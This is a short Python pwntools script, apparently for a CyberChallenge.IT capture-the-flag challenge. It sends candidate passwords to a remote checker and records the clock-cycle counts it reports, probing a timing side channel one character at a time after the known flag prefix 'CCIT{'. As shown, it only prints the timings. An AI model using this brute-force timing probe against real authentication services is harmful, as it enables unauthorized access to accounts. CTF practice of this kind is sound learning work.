import string
import re
from statistics import mean
from pwn import *

# Connect to the remote service
s = remote('benchmark.challs.cyberchallenge.it', 9031)
# Skip banner
s.recvuntil(b"check:")


def try_password(s, password):
    # Send password
    s.sendline(password.encode())
    # Receive response
    response = s.recvuntil(b"check:").decode()
    # Extract clock cycles using regex
    match = re.search(r'checked in (\d+) clock cycles', response)
    if match:
        cycles = int(match.group(1))
        return cycles, "Correct" in response
    elif "Correct" in response:
        return -1, True
    else:
        return 0, False


# Analyze the clock cycles for the first few characters of 'CCIT{'
password = ""
known_password = "CCIT{"
CHARSET = string.ascii_letters + string.digits + string.punctuation
for i in known_password:
    for c in CHARSET:
        test_password = password + c
        cycles, correct = try_password(s, test_password)
        print(f"Password: {test_password}, Cycles: {
              cycles}, Correct: {correct}")

    # Add the known correct character to the password
    password += i

# Close the connection
s.close()
